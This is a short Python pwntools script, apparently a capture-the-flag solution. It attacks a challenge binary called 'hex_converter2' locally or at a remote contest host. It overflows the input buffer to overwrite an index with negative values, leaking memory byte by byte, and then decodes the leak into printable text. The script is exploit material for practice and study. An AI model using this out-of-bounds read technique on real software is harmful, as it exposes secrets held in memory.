#!/usr/bin/python3

from pwn import *
import string

local = True
is_debug = False
filename = './hex_converter2'
hostname = 'amt.rs'
port = 31631

def get_process():
    ''' Creates process '''
    if local:
        if is_debug:
            return gdb.debug(filename, '''
            break main
            continue
            ''')
        else:
            return process(filename)
    else:
        return remote(hostname, port)

all_data = ''
for index in range(-250,0):
    offset = 28
    proc = get_process()
    proc.recvuntil(b'input text to convert to hex: \n')
    payload = b'A' * offset
    payload += pack(index, 64, 'little', True)
    proc.sendline(payload)
    data = proc.recvall(timeout=3).decode().strip()
    all_data += data
print(all_data)

printables = ''
for i in range(0,len(all_data),2):
    val = all_data[i:i+2]
    c = chr(int(val, 16))
    if c in string.printable:
        printables += c
print(printables)
